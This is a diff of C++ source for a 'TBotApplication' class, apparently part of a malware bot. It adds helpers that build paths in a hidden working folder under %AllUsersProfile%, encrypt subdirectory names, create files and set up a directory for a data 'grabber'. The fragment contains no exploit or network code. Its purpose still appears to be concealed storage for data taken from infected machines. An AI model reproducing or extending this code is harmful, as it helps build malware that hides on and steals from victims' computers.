@@ -114,6 +114,95 @@ string TBotApplication::WorkPath()
 }
 //-------------------------------------------------------------
 
+string TBotApplication::MakePath(const char* SubDirectory)
+{
+	// Функция собирает путь с указанной поддиректорией
+	// ВАЖНО:
+	// Функция не поддерживает вложенные поддиректории.
+	// ДЛя обеспечения уникальности, имя директории шифруется
+
+	string Path = WorkPath();
+
+	if (!STRA::IsEmpty(SubDirectory))
+	{
+		if (SubDirectory[0] == SlashChar)
+			SubDirectory++;
+
+		string Temp = SubDirectory;
+
+		if (Temp[Temp.Length() - 1] == SlashChar)
+			Temp[Temp.Length() - 1] = 0;
+
+		PCHAR SD = UIDCrypt::CryptFileName(Temp.t_str(), false);
+
+		Path += SD;
+		Path += Slash;
+
+		STR::Free(SD);
+
+		if (!DirExists(Path.t_str()))
+			pCreateDirectoryA(Path.t_str(), NULL);
+    }
+	return Path;
+}
+
+string TBotApplication::MakePath(const string &SubDirectory)
+{
+	return MakePath(SubDirectory.t_str());
+}
+//-------------------------------------------------------------
+
+string TBotApplication::CreateFile(const char* SubDir, const char* FileName)
+{
+	string Name = MakeFileName(SubDir, FileName);
+	File::WriteBufferA(Name.t_str(), NULL, 0);
+	return Name;
+}
+
+string TBotApplication::CreateFile(const string &SubDir, const char* FileName)
+{
+	return CreateFile(SubDir.t_str(), FileName);
+}
+
+
+//-------------------------------------------------------------
+
+string TBotApplication::MakeFileName(const char* SubDir, const char* FileName)
+{
+	// Функция собирает имя файла в рабочей папке бота
+	string Name = MakePath(SubDir);
+	Name += FileName;
+	return Name;
+}
+
+string TBotApplication::MakeFileName(const string &SubDir, const char* FileName)
+{
+	return MakeFileName(SubDir.t_str(), FileName);
+}
+//-------------------------------------------------------------
+
+bool TBotApplication::FileExists(const char* SubDir, const char* FileName)
+{
+	// Функция проверяет наличие файла в рабочей папке бота
+	string Name = MakeFileName(SubDir, FileName);
+	return File::IsExists(Name.t_str());
+}
+
+bool TBotApplication::FileExists(const string &SubDir, const char* FileName)
+{
+	return FileExists(SubDir.t_str(), FileName);
+}
+//-------------------------------------------------------------
+
+string TBotApplication::GrabberPath()
+{
+	// Путь к рабочему каталогу грабера данных
+	if (FGrabberPath.IsEmpty())
+		FGrabberPath = MakePath(GetStr(StrGrabberPath));
+	return FGrabberPath;
+}
+//-------------------------------------------------------------
+
 string TBotApplication::PrefixFileName()
 {
 	// Функция возвращает имя файла для хранения префикса
@@ -135,7 +224,7 @@ PCHAR TBotApplication::GetWorkFolder()
 		return BOT_WORK_FOLDER_NAME;
 
 	// Генерируем имя на основе константы обработанной ключём из уида
-	string WorkPath = GetStr(BotWorkPath);
+	string WorkPath = GetStr(StrBotWorkPath);
 
 	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
 
@@ -193,7 +282,7 @@ string TBotApplication::MakeWorkPath(bool SystemPath)
 	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
 		return Result;
 
-	Result = Path.AsStr();
+	Result =  Path.AsStr();
 	Result += GetWorkFolder();
 	Result += "\\";
 
@@ -224,6 +313,13 @@ void TBotApplication::SaveSettings()
 		SavePrefixToFile(PrefixFile.t_str());
 }
 //----------------------------------------------------------------------------
+
+
+
+
+
+
+
 
 
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
@@ -296,7 +392,6 @@ PCHAR BOT::GetWorkPathInSysDrive(PCHAR SubDir, PCHAR FileName)
 DWORD BOT::GetWorkFolderHash()
 {
 	//  Функция возвращает хэш имени рабочей папки
-	Bot->GetWorkFolder();
 	return BotWorkPathHash;
 }
 //----------------------------------------------------------------------------
